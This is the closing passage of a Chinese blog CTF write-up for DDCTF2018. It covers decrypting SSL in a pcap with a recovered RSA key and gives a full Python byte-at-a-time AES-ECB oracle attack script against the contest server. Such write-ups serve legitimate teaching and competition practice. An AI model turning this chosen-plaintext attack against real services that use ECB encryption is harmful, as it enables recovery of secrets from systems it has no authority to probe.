+<p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式<br>—–BEGIN RSA PRIVATE KEY—–<br>XXXXXXX<br>—–END RSA PRIVATE KEY—–<br>附件：<a href="http://ddctf.didichuxing.com/files/aaeb26c08965dce3b8a5f0f6a18a15a0/1cMYNO2TCQHSfJwxnvm4z.pcap" target="_blank" rel="noopener">1cMYNO2TCQHSfJwxnvm4z.pcap</a></p>
+</blockquote>
+<p>这个题目就是一个典型的分析ssl加密流量的题，花了很多时间在流量里面的一个转fl-g.zip文件的ftp流量，但是文件是破损的，中间有很多包丢了，这只是用来迷惑参赛者的。。。看到题目提示去找到ssl流量，但是私钥又不知道在哪，最后在SMTP流量里面发现了一个图片，base64编码的，用py解码到文件里面，打开后看到了私钥：<br><img src="/2018/04/30/DDCTF2018-WriteUp/rsa_private_key.png" alt="rsa_private_key.png"><br>mmp一个个手敲这不得累死，上OCR吧，然后试了各种在线OCR，最后发现QQ自带的文字识别是最准的，鹅厂还是6啊，里面只有很少的错误需要改一下，主要是O和0有时候会识别错误要注意检查一下，其他的都没有大问题（还是肉眼检查了一遍，不过总比手敲好，最后写wp的时候才发现题目给的MD5是用来检查私钥的。。），第一次导入私钥到wireshark的时候还有一个0没改成O，然后就卡在这儿了，ssl还是加密的，我还一度怀疑我的wireshark是不是有问题。。。最后再检查一遍才发现0没改过来。确认私钥没错之后，导入wireshark，导入之后wireshark会自己刷新一下，ssl加密的通讯立马就变成明文了，然后在明文里面找到flag。  </p>
+<h2 id="Misc5-安全通信"><a href="#Misc5-安全通信" class="headerlink" title="Misc5 安全通信"></a>Misc5 安全通信</h2><blockquote>
+<p>请通过nc 116.85.48.103 5002答题，mission key是b9ba15b341c847c8beba85273f9b7f90，agent id随意填就可以</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_padding</span><span class="params">(rawstr)</span>:</span></span><br><span class="line">    remainder = len(rawstr) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span> * (<span class="number">16</span> - remainder)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_encrypt</span><span class="params">(key, plaintext)</span>:</span></span><br><span class="line">    plaintext += get_padding(plaintext)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    cipher_text = aes.encrypt(plaintext).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hello</span><span class="params">(key, name, flag)</span>:</span></span><br><span class="line">    message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(name, flag)</span><br><span class="line">    <span class="keyword">return</span> aes_encrypt(key, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_output</span><span class="params">(message)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">()</span>:</span></span><br><span class="line">    print_output(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">    mission_key = get_input().rstrip()</span><br><span class="line"></span><br><span class="line">    print_output(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">    agentid = get_input().rstrip()</span><br><span class="line">    rnd = Random.new()</span><br><span class="line">    session_key = rnd.read(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">'&lt;secret&gt;'</span></span><br><span class="line">    print_output(generate_hello(session_key, agentid, flag))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print_output(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>)</span><br><span class="line">        msg = get_input().rstrip()</span><br><span class="line">        <span class="keyword">if</span> msg == <span class="string">'quit'</span>:</span><br><span class="line">            print_output(<span class="string">"Bye!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        enc = aes_encrypt(session_key, msg)</span><br><span class="line">        print_output(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    handle()</span><br></pre></td></tr></table></figure>
+<p>AES-128加密的flag，爆破是不可能爆破的，这辈子都不可能直接爆破的。flag至少十几位啊。但是呢，仔细看看这个题目，它用的是ECB模式的AES，是分段加密的，并没有进行矩阵加密，是可以分段解密的，然后agent id，也就是name可以控制flag的在字符串中的偏移，这样看好像可以逐位爆破。思路就是用已知明文和一位未知明文组合，放在AES加密的同一分段里面，然后爆破这一位明文，校验AES值，爆破出来后再将字符串左移一位，继续爆破后面的一位明文。这个题目用的是AES-128的ECB模式，那么每16字节就是一个分段，也就是用15个已知明文字符和一个未知明文字符组合为一个分段进行爆破，于是写出解题代码（以下代码借鉴了Enigma2017 CTF中Broken Encryption一题的<a href="https://michael-myers.github.io/blog/post/enigma2017-broken-encryption-writeup/" target="_blank" rel="noopener">Writeup</a>）：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time       <span class="comment"># for using a delay in network connections</span></span><br><span class="line"><span class="keyword">import</span> telnetlib  <span class="comment"># don't try using raw sockets, you'll tear your hair out trying to send the right line feed character</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Ex1t'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_challenge</span><span class="params">(challenge)</span>:</span></span><br><span class="line">    ciphertext_blocks = [challenge[<span class="number">0</span>:<span class="number">32</span>], challenge[<span class="number">32</span>:<span class="number">64</span>], challenge[<span class="number">64</span>:<span class="number">96</span>],</span><br><span class="line">                         challenge[<span class="number">96</span>:<span class="number">128</span>], challenge[<span class="number">128</span>:<span class="number">160</span>], challenge[<span class="number">160</span>:<span class="number">192</span>],</span><br><span class="line">                         challenge[<span class="number">192</span>:<span class="number">224</span>], challenge[<span class="number">224</span>:]]</span><br><span class="line">    <span class="keyword">return</span> ciphertext_blocks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    host = <span class="string">'116.85.48.103'</span></span><br><span class="line">    port = <span class="number">5002</span></span><br><span class="line"></span><br><span class="line">    flag = <span class="string">"DDCTF&#123;"</span></span><br><span class="line">    padchar = <span class="string">'0'</span></span><br><span class="line">    guessed_block = <span class="string">'flag is: DDCTF&#123;'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        test_pad = <span class="string">"01234567"</span> + i * padchar</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        tn = telnetlib.Telnet(host, port)</span><br><span class="line">        tn.read_until(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">        tn.write(<span class="string">"b9ba15b341c847c8beba85273f9b7f90\r\n"</span>)</span><br><span class="line">        tn.read_until(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">        send_string = test_pad + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="comment">#print(send_string)</span></span><br><span class="line">        tn.write(send_string)</span><br><span class="line">        tn.read_until(<span class="string">'\n'</span>)</span><br><span class="line">        challenge = tn.read_until(<span class="string">'\n'</span>).decode().strip()</span><br><span class="line">        <span class="comment">#print(challenge)</span></span><br><span class="line">        ciphertext_blocks = parse_challenge(challenge)</span><br><span class="line">        <span class="keyword">for</span> guessed_byte <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7E</span>):  <span class="comment"># printable ASCII range</span></span><br><span class="line">            test_block = guessed_block + chr(guessed_byte)</span><br><span class="line">            tn.read_until(</span><br><span class="line">                <span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>)</span><br><span class="line">            tn.write(test_block + <span class="string">"\r\n"</span>)</span><br><span class="line">            tn.read_until(<span class="string">'\n'</span>)</span><br><span class="line">            test_enc = tn.read_until(<span class="string">'\n'</span>).decode().strip()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Telnet input MUST BE DELIVERED with a \r\n line ending. If you send</span></span><br><span class="line">            <span class="comment"># only the \n the remote end will silently error on your input and send back</span></span><br><span class="line">            <span class="comment"># partially incorrect ciphertext! Untold hours debugging that bullshit.</span></span><br><span class="line">            <span class="comment"># Here we carefully convert the bytearray to ASCII and then to a string type,</span></span><br><span class="line">            <span class="comment"># or else telnetlib barfs because of the hell that is dynamic typing.</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"Currently guessing: "</span> + test_block)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> test_enc == ciphertext_blocks[<span class="number">6</span>]:</span><br><span class="line">                flag = flag + chr(guessed_byte)</span><br><span class="line">                guessed_block += chr(guessed_byte)</span><br><span class="line">                guessed_block = guessed_block[<span class="number">1</span>:]</span><br><span class="line">                print(<span class="string">"Guessed a byte of the secret, flag:"</span> + flag)</span><br><span class="line">                <span class="comment"># Finish the inner loop immediately, back up to the outer loop.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        tn.close()</span><br><span class="line">        <span class="keyword">if</span>(flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"flag: "</span> + flag)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://ex1t.space">Ex1t</a>
+            <p>原文链接：<a href="http://ex1t.space/2018/04/30/DDCTF2018-WriteUp/">http://ex1t.space/2018/04/30/DDCTF2018-WriteUp/</a>
+            <p>发表日期：<a href="http://ex1t.space/2018/04/30/DDCTF2018-WriteUp/">April 30th 2018, 9:13:53 pm</a>
+            <p>更新日期：<a href="http://ex1t.space/2018/04/30/DDCTF2018-WriteUp/">October 24th 2018, 8:28:18 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/25/折腾Docker记下来的东西/" title= "折腾Docker记下来的东西">
+                    <div class="nextTitle">折腾Docker记下来的东西</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2017/12/01/windows-x64函数调用约定/" title= "windows x64函数调用约定">
+                    <div class="prevTitle">windows x64函数调用约定</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:chanshon@outlook.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/S-Ex1t" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1-数据库的秘密"><span class="toc-number">1.1.</span> <span class="toc-text">Web1 数据库的秘密</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc1-签到题"><span class="toc-number">2.1.</span> <span class="toc-text">Misc1 签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc2-╯°□°）╯︵-┻━┻"><span class="toc-number">2.2.</span> <span class="toc-text">Misc2 (╯°□°）╯︵ ┻━┻</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc3-第四扩展FS"><span class="toc-number">2.3.</span> <span class="toc-text">Misc3 第四扩展FS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc4-流量分析"><span class="toc-number">2.4.</span> <span class="toc-text">Misc4 流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc5-安全通信"><span class="toc-number">2.5.</span> <span class="toc-text">Misc5 安全通信</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 12
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2020/06/25/虚拟机相关/" >虚拟机相关</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/Linux的杂七杂八/" >Linux的杂七杂八</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/GDB在CTF解题中的一些使用技巧/" >GDB在CTF解题中的一些使用技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2018/11/25/折腾Docker记下来的东西/" >折腾Docker记下来的东西</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href= "/2018/04/30/DDCTF2018-WriteUp/" >DDCTF2018_WriteUp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2017/12/01/windows-x64函数调用约定/" >windows x64函数调用约定</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/虚拟主机的两种工作方式/" >虚拟主机的两种工作方式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2017/09/22/Requests库POST文件名为中文时出现Bug（修复方法）/" >Requests库POST文件名为中文时出现Bug（修复方法）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2017/04/11/NC-reverse-shell/" >NC reverse shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2017/04/03/使用numpy解方程组/" >使用numpy解方程组</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2017/04/02/各种关于Hexo的问题/" >各种关于Hexo的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2017/02/21/Github-域名绑定/" >Github-域名绑定</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="域名"><span class="iconfont-archer">&#xe606;</span>域名</span>
+    
+        <span class="sidebar-tag-name" data-tags="Github"><span class="iconfont-archer">&#xe606;</span>Github</span>
+    
+        <span class="sidebar-tag-name" data-tags="WriteUp"><span class="iconfont-archer">&#xe606;</span>WriteUp</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pentest"><span class="iconfont-archer">&#xe606;</span>Pentest</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Pentest"><span class="iconfont-archer">&#xe60a;</span>Pentest</span>
+    
+        <span class="sidebar-category-name" data-categories="编程学习"><span class="iconfont-archer">&#xe60a;</span>编程学习</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Ex1t"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
